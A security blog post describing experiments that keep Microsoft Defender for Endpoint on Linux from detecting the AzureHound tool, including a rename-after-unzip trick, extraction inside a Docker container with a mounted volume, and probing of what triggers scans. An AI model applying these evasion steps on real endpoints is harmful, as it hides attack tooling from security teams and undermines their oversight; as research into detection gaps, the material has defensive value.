---
title: 'Evading microsoft defender on linux devices'
date: 2024-10-02
author: Sergio Roselló
description: How to prevent microsoft defender for linux detecting a blacklisted application
tags:
  - Docker
  - Containers
  - Microsoft defender
  - Security
---
Enterprise security teams want to get alerted when some post-exploitation tool gets installed on a endpoint however, they have to know what capabilities are supported because hackers might find a way to circumvent these controls.

# TL;DR

To evade Microsoft defender, you can use the following command from the directory where the compressed files reside.

```bash
docker run --rm -v ./:/workstation alpine:latest /bin/sh -c "cd workstation && unzip zipped-content.zip"
```

# The evasion attempts

I was doing a [pwnedlabs.io](http://pwnedlabs.io) exercise, which requested that we install the `azurehound` tool on our machine. When I unzipped the tool, I noticed it had magically disappeared. Being in security, I assumed Microsoft defender for endpoints was responsible for the detection and deletion of the file. 

I wondered however, if there was a way in which I could unzip and use the downloaded binary without Microsoft defender for endpoint detecting and deleting it beforehand.

## First attempt

`unzip azurehound-linux-amd64.zip` resulted on a `azurehound` binary that disappeared after a couple of seconds. The security operations team got the alert and notified me in a matter of minutes.

## Second attempt

`unzip azurehound-linux-amd64.zip && mv azurehound new-azh`

It seems that `wdavdaemon` (microsoft defender for linux) does detect there is a file being unzipped, but as it seems not to track `mv`commands, when it attempts to access it, it errors, saying that the file has not been found. Here we can see a log output of the `unzip`operation as well as the logs being outputted by `wdavdaemon`. 

```bash
$ unzip azurehound-linux-amd64.zip && mv azurehound new-azh    
Archive:  azurehound-linux-amd64.zip
  inflating: azurehound              
$ ls
azurehound-linux-amd64.zip  new-azh  output.json  pwn.json  sqli.sh
$ sudo grep azurehound /var/log/microsoft/mdatp/microsoft_defender_err.log 
[155521][128133707597376][2024-09-25 11:00:28.485908 UTC][error]: TRACE_ERROR,Callback failed with return code:1 for path:/home/user/path/azurehound
[155521][128133707597376][2024-09-25 11:00:28.485949 UTC][error]: TRACE_ERROR,CreateInstance: Received invalid file descriptor for path:/home/user/path/azurehound!
[155521][128133707597376][2024-09-25 11:00:28.486726 UTC][error]: TRACE_ERROR,Callback failed with return code:1 for path:/home/user/path/azurehound
[155521][128133707597376][2024-09-25 11:00:28.486755 UTC][error]: TRACE_ERROR,CreateInstance: Received invalid file descriptor for path:/home/user/path/azurehound!
[155521][128133707597376][2024-09-25 11:00:28.486926 UTC][error]: {"code":{"category":"generic","value":32793,"message":"unspecified generic_category error"},"call_stack":{"frames":[{"file":"mpengine_core.cpp","line":5463},{"file":"mpengine_core.cpp","line":1780}]},"context":["Error in rescan_resources_worker for resource /home/user/path/azurehound"]}
$ ls 
azurehound-linux-amd64.zip  new-azh  output.json  pwn.json  sqli.sh
```

As the file cannot be accessed, there in no alert being created upstream, therefore this is a successful extraction of malicious files without alerting our enterprise security operators.

The only downside here, is that `wdavdaemon`is actually identifying the malicious file, but as it has been renamed before it can access it to check, it outputs an error.

Can we do one better?

## Third time’s the charm

To completely evade `wdavdaemon`from detecting that a malicious file is being accessed, we can run the extraction operation inside a Docker container.

The command would be:

```bash
docker run --rm -v ./:/workstation alpine:latest /bin/sh -c "cd workstation && unzip azurehound-linux-amd64.zip"
```

I have tried to understand exactly why the Microsoft defender daemon does not recognize the extracted file as malicious if extracted from within a container image. I assume it must be related with `cgroups`and `namespaces`. My guess is that the daemon ignores analyzing mounted volumes. To my knowledge, the host system and processes should be able to see namespaces created from within themselves, so in theory it should be able to detect the extracted file just as it detects it without Docker.

# Further investigation

## Facts

1. The daemon **does not** get triggered when new permissions are added (`chmod +x azurehound`)
2. The daemon **does not** get triggered on execution (`./azurehound`) 
3. The daemon **does not** get triggered by renaming (`mv azurehound new-azurehound`) 
4. The daemon **does** get triggered by copying the file (`cp new-azurehound azurehound`) and is marked in Azure defender as a file creation.
5. The daemon **does** get triggered by: `cat new-azurehound > azurehound` and deletes the file, which means that the daemon does not look at the executability of the file being created.
6. The daemon **does** get triggered when we strip any kind of section from the file, like `strip --remove-section=.plt new-azh`or `strip --strip-all new-azh`
7. The daemon **does** get triggered when we truncate at 7MB (`truncate -s 7M new-azh`) 
8. The daemon **does not** get triggered at 6MB (`truncate -s 6M new-azh`)

With this information, we can assume the daemon gets triggered on file creation.

I was curious as to weather normal file creation was also triggering `wdavdaemon` to scan the newly created resources, but it seems otherwise.

```bash
$ touch buenas && mv buenas hola 
$ ls 
azurehound-linux-amd64.zip  hola  new-azh  output.json  pwn.json  sqli.sh
$ sudo grep buenas /var/log/microsoft/mdatp/microsoft_defender_err.log 
$ 
```

Analyzing the unzip operation with `strace` provides us with all the kernel-level function calls performed. Showed below:

```bash
access
arch_prctl
brk
close
execve
exit_group
fchmod
getrandom
ioctl
lseek
mmap
mprotect
munmap
newfstatat
openat
pread64
prlimit64
read
rseq
rt_sigaction
set_robust_list
set_tid_address
utimensat
write
```

If we assume that one of the above syscalls does trigger `wdavdaemon`, we can filter out syscalls that do not trigger it by executing similar commands. If we could determine exactly what syscall triggers `wdavdaemon`, then we could avoid its use and prevent detection in the host system, rather than extracting by docker.

## Narrowing down the triggering syscalls

syscalls for a `touch buenas`command:

```bash
access
arch_prctl
brk
close
dup2
execve
exit_group
getrandom
mmap
mprotect
munmap
newfstatat
openat
pread64
prlimit64
read
rseq
set_robust_list
set_tid_address
utimensat
```

Let’s remove all syscalls that these two commands have in common. 
Our list boils down to these possible triggering calls. If we look at what each call does, we get three possible candidates.

```bash
dup2          : Typically used for redirecting file descriptors.
fchmod        : Changes the permissions of a file; In our case to a executable file. This might be promissing.
ioctl         : Can be used for device specific operations; Not very likely in this case.
lseek         : Used for changing the file offset.
rt_sigaction  : Used for changing signal actions.
write         : Used to write data to a file descriptor. If I had to guess, this is the most likely, so let's start with this one.
```

We know that executing `echo “buenas" > buenas` uses syscall `write` to write `buenas`to the file `buenas`. so now, to check if `wdavdaemon` gets triggered, we have to emulate the original command.

```bash
$ echo "testing if wdavdaemon gets triggered..." > test-trigger && mv test-trigger new-test-trigger
$ sudo grep test-trigger /var/log/microsoft/mdatp/microsoft_defender_err.log             
$          
```

To my surprise, `wdavdaemon`does not get triggered. 

Let’s try to trigger it with the `unzip`command directly:

```bash
$ zip test-trigger.zip test-trigger                         
$ unzip test-trigger.zip && mv test-trigger new-test-trigger
Archive:  test-trigger.zip
 extracting: test-trigger            
$ sudo grep "test-trigger" /var/log/microsoft/mdatp/microsoft_defender_err.log 
$
```

Even using zip, the original command that triggers `wdavdaemon`does not seem to work, so what are we left with? What is the daemon looking for, in order to scan a file?

I even got an executable file `gopls`  to replicate as much as possible the trigger process, but even with this, `wdavdaemon`does not get triggered.

Interestingly, the daemon relies on some information on the file, as truncating a file at different sections triggers and not the alert. 

```bash
$ unzip azurehound-linux-amd64.zip && mv azurehound new-azh       [16:54:03]
Archive:  azurehound-linux-amd64.zip
  inflating: azurehound              
$ ls                                                              [16:54:05]
azurehound-linux-amd64.zip  new-azh
$ truncate -s 7M new-azh                                          [16:54:08]
$ ls                                                              [16:54:29]
azurehound-linux-amd64.zip  new-azh
$ ls                                                              [16:54:29]
azurehound-linux-amd64.zip
$                                                                 [16:54:32]

$ unzip azurehound-linux-amd64.zip && mv azurehound new-azh       [16:56:37]
Archive:  azurehound-linux-amd64.zip
  inflating: azurehound              
$ truncate -s 6M new-azh                                          [16:56:48]
$ ls                                                              [16:56:54]
azurehound-linux-amd64.zip  new-azh
$ ls                                                              [16:56:59]
azurehound-linux-amd64.zip  new-azh
$   
```

We can see from the above section, that somewhere between MB 6 and 7 is helping `wdavdaemon`identify the file.

# Conclusion

There fastest way to evade Microsoft defender for Linux is to run the desired command inside a container that has a volume mapped to the host. From there, you can edit and execute the malicious file without it being detected.

Regarding the triggering mechanism of `wdavdaemon`, I am yet to understand it’s logic but my guess is that the daemon is fingerprinting the file based on some short section of it, and later requesting a more in-depth analysis of the same. If the file is indeed in Microsoft’s blacklist, then an alert gets sent to the security operations professionals managing the enterprise infrastructure.
